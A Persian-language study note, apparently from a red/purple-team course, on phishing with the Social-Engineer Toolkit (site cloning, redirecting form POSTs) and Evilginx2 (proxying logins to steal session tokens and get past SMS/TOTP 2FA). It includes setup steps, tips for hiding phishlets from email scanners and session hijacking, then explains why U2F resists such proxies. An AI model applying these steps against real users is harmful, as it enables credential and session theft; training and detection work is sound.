![Image](https://images.openai.com/static-rsc-4/BVg-ktxKlBZoS8QCWMw_awMuVy5UX26hpMPgIjwzZZW0twKV84x6P4RFssI1B-jinbFyLtkssTXgZnSYSHNNzCICz_1zW4zpF71oHMyVAUo4soqGkp0X6-vAQn5CO6e_ZY15PzrqQiu0DVMWUzKQqNSTkfbVRDEkLKqiL-0Z0ZUByAg24VqSNrN3mzdxp-ty?purpose=fullsize)

### SET دقیقاً چه کار می‌کند؟

به‌صورت مفهومی، ابزار مجموعه‌ای از سناریوهای Social Engineering را آماده می‌کند، مثل:

```text
SET
│
├── Phishing / Credential Harvesting
├── Spear-Phishing
├── Web-based Attacks
├── Payload / Client-side techniques
├── QR-code based attacks
└── Social Engineering workflows
```

مثلاً در یک **Authorized Phishing Simulation** می‌توانی جریان را بررسی کنی:

```text
Attacker / Red Team
        │
        │ Social Engineering
        ▼
     Target
        │
        ▼
 Fake / Simulated Web Page
        │
        ▼
 Authentication Attempt
        │
        ▼
 Detection
        │
 ├── Email Security
 ├── DNS / Domain controls
 ├── Proxy / Web filtering
 ├── EDR
 └── SIEM
```


---

![[Pasted image 20260917013833.png]]


Social Engineer Toolkit 
. بهتر است این ابزار را روی سروری اجرا کنید که برای جمع‌آوری credentialها از آن استفاده می‌کنید. . یک رکورد A ایجاد کنید که به IP address این سرور اشاره کند. . SET به دو اطلاعات نیاز دارد: (۱) IP address یا domain این سرور چیست و (۲) می‌خواهید کدام سایت را clone کنید؟


- **SET همین کارها را انجام داده است:**
    
- کد **HTML** صفحه هدف را دریافت کرده است.
    
- تمام لینک‌های مرتبط، مثل **CSS** و **JavaScript** و موارد مشابه را به **Absolute Link** تبدیل کرده تا Style یا JavaScript صفحه خراب نشود.
    
- فیلد **`POST action`** فرم را تغییر داده تا به **Domain/IP شما** اشاره کند؛ بنابراین داده‌های ارسال‌شده توسط فرم به سمت سرور شما ارسال می‌شوند.
    
- یک **Web Server** راه‌اندازی کرده و صفحه Clone شده را روی **Port 80** میزبانی کرده است.
    
- همچنین امکان راه‌اندازی **SSL/HTTPS** را دارد.
    

### مفهوم قسمت مهم

مثلاً صفحه اصلی فرم داشته باشد:

```html
<form action="https://example.com/login" method="POST">
```

SET در سناریوی توضیح‌داده‌شده، مقصد فرم را به زیرساخت خودش تغییر می‌دهد؛ در نتیجه:

```text
User
  ↓
Cloned Web Page
  ↓
Submit Form
  ↓
Your Server
```

یعنی اصل کاری که این بخش توضیح می‌دهد **Web Cloning + تغییر Form POST destination** است.


![[Pasted image 20260917014159.png]]



---

![[Pasted image 20260917015930.png]]

Evilginx Pro is the fruit of a passion I've had for a long time in developing offensive security tools for cybersecurity enthusiasts. The journey has just begun, and now that the product is officially released, I can focus on making it even better by implementing all the ideas I've planned for it.

### Key features:

[](https://github.com/kgretzky/evilginx2?ref=sentinel.blog#key-features)

- Out-of-the-box **phishing detection evasion** (including Chrome's Enchanced Browser Protection)
- Tested and maintained **official phishlets database**
- **Botguard** to **prevent bot traffic** by default (same concept as Cloudflare Turnstile)
- **Evilpuppet** for advanced phishing capability (Google)
- External **DNS providers** with multi-domain support
- **Website spoofing** for unauthorized requests
- **JavaScript** & **HTML obfuscation**
- **Wildcard TLS certificates**
- **Automated** server deployment
- **SQLite** database support

:

### Evilginx2

- **Phishing with 2FA**  
    فیشینگ در شرایطی که **2FA** فعال است.
    
- **Works against SMS, Authenticator Apps, Authenticator Codes**  
    می‌تواند در سناریوهای فیشینگ، مکانیسم‌هایی مثل **SMS، Authenticator App و Authenticator Code** را هدف قرار دهد.
    
- **Evilginx2 is a Man-in-the-Middle Web Proxy**  
    Evilginx2 یک **Web Proxy از نوع Man-in-the-Middle** است.
    
- **No phishing templates**  
    برخلاف بعضی ابزارها، الزاماً به **Phishing Template** آماده متکی نیست.
    
- **Evilginx2 acts as server to target over HTTPS**  
    از دید کاربر هدف، Evilginx2 نقش **Server** را روی HTTPS ایفا می‌کند.
    
- **Evilginx2 acts as client to legitimate site over HTTPS**  
    هم‌زمان در سمت دیگر، به‌عنوان **Client** به سایت واقعی و Legitimate متصل می‌شود.
    
- **Evilginx2 relays actual website to the phished user**  
    محتوای سایت واقعی را از طریق Proxy به کاربر هدف منتقل می‌کند.
    
- **Captures all user data in the process...**  
    در این فرایند می‌تواند داده‌های عبوری مثل **Username، Password و به‌خصوص Session Token** را مشاهده/جمع‌آوری کند.
    

### نکته مهم

تفاوت اصلی با **Credential Phishing معمولی** اینجاست:

```text
Credential Phishing:
User → Fake Website → Username/Password

Evilginx-style Proxy:
User → Proxy → Real Website
          ↕
       HTTPS
```

بنابراین بحث اصلی Evilginx فقط گرفتن Password نیست؛ **Session Token/Cookie** اهمیت زیادی دارد، چون بعد از authentication و 2FA ایجاد می‌شود.

![[Pasted image 20260917021344.png]]

![[Pasted image 20260917021355.png]]
![[Pasted image 20260917021404.png]]


. مفاهیم کلیدی:  
· config  
تنظیمات پیکربندی؛ برای تعریف و تنظیم IP address و مشخصات phishing domain.  
help config

· phishlets  
تعریف سناریوهای هدف، مانند OWA، Gmail، LinkedIn و سرویس‌های مشابه.  
help phishlets

· lures  
برای هر Target یک لینک اختصاصی ایجاد می‌شود که به آن Lure گفته می‌شود.  
help lures


![[Pasted image 20260917021719.png]]

![[Pasted image 20260917021947.png]]

![[Pasted image 20260917022100.png]]

![[Pasted image 20260917022118.png]]


![[Pasted image 20260917022153.png]]


##### بعد از اینکه Token  رو بدست اوردیم Session Hijaking میزنیم 

### Evilginx2 — نکات حرفه‌ای (Pro Tips)

- **Evilginx2 را داخل یک `screen` اجرا کنید.**  
    این کار باعث می‌شود فرآیند Evilginx2 حتی پس از جدا شدن از Terminal نیز در پس‌زمینه فعال باقی بماند.
    
- **Phishletها را در صورت نیاز Hide/Unhide کنید.**  
    برای مثال، ممکن است هنگام بررسی یک URL توسط **Email Scanner**، وضعیت Phishlet را تغییر دهید.
    
- **برای `global redirect_url` یک مقصد مشخص تنظیم کنید.**  
    مقدار پیش‌فرض آن کاربر را به یک **Rickroll** هدایت می‌کند؛ یعنی همان ویدئوی معروف Rick Astley.
    

### مفهوم اصطلاحات

```text
screen       → اجرای پایدار برنامه در Terminal
phishlet     → تعریف سناریوی Proxy برای یک Target
hide/unhide  → مخفی/فعال کردن Phishlet
redirect_url → مقصدی که کاربر در صورت redirect شدن به آن هدایت می‌شود
```

نکته: بخش **Hide/Unhide کردن برای عبور از Email Scanner** عملاً یک تکنیک **evasion** است؛ برای لاب Purple Team بهتر است همین قسمت را از دید Detection بررسی کنیم، یعنی ببینیم Scanner چه زمانی URL را بررسی می‌کند و چه telemetryای ایجاد می‌شود.


![[Pasted image 20260917022440.png]]



### پس چه زمانی این روش کار می‌کند؟

سایت‌هایی که **2FA** فعال دارند، از جمله:

- **SMS**
    
- **Authenticator Codes**
    
- **Authenticator Apps**
    

### چه زمانی کار نمی‌کند؟

در برابر **U2F (Universal 2nd Factor Authentication)**، مانند دستگاه‌های **YubiKey**.

دلیلش این است که در پروتکل **U2F**، **Domain وب‌سایت** بخشی از فرآیند احراز هویت و Negotiation است.

در زمان انجام **Handshake** بین U2F و Login Server، سرور احراز هویت می‌تواند بررسی کند که درخواست مربوط به چه Domain واقعی‌ای است. اگر Domain با سایت Legitimate مورد انتظار مطابقت نداشته باشد، **Authentication شکست می‌خورد**.

### نکته فنی مهم

ایده اصلی تفاوت اینجاست:

```text
SMS / TOTP
User → Phishing Proxy → Legitimate Site
              │
              └── OTP قابل Relay است
```

اما در **U2F/WebAuthn**، اعتبارسنجی به **Origin/Domain** وابسته است:

```text
Browser
   │
   ▼
Origin
   │
   ▼
Hardware Authenticator
   │
   ▼
Cryptographic verification
```




فرق اصلی اینه که **2FA یک مفهوم کلیه، ولی U2F یک روش/استاندارد مشخص برای اجرای یک Second Factor هست.**

### 2FA چیست؟

**2FA = Two-Factor Authentication**

یعنی برای Login حداقل دو عامل از دو دسته مختلف لازم باشد:

```text
Something you know   → Password
+
Something you have   → Phone / Security Key
```

مثلاً:

```text
Password + SMS Code
Password + TOTP (Authenticator)
Password + Security Key
```

همه این‌ها می‌توانند **2FA** باشند.

---

### U2F چیست؟

**U2F = Universal 2nd Factor**

یک استاندارد مشخص برای استفاده از **Hardware Security Key** به‌عنوان عامل دوم است.

مثلاً:

```text
Password
   +
YubiKey
   ↓
Authentication
```

و بخش مهمش **Cryptographic + Origin Binding** است.

---

### پس رابطه‌شان:

```text
                2FA
                 │
       ┌─────────┼─────────┐
       │         │         │
      SMS       TOTP      U2F
                           │
                        YubiKey
```

بنابراین:

**هر U2F معمولاً یک 2FA است، ولی هر 2FA، U2F نیست.**

مثلاً:

```text
Gmail + Password + SMS
        ↓
       2FA ✓
       U2F ✗
```

اما:

```text
Password + YubiKey (U2F)
        ↓
       2FA ✓
       U2F ✓
```

و برای بحثی که درباره **Evilginx** داشتیم، تفاوت مهم همین است: **SMS/TOTP کد قابل Relay دارند، اما U2F/FIDO2 با Cryptographic Origin Binding برای Phishing مقاومت بسیار بیشتری دارد.**



### Reference

https://www.youtube.com/watch?v=r4Y53s6P51k&t=756s

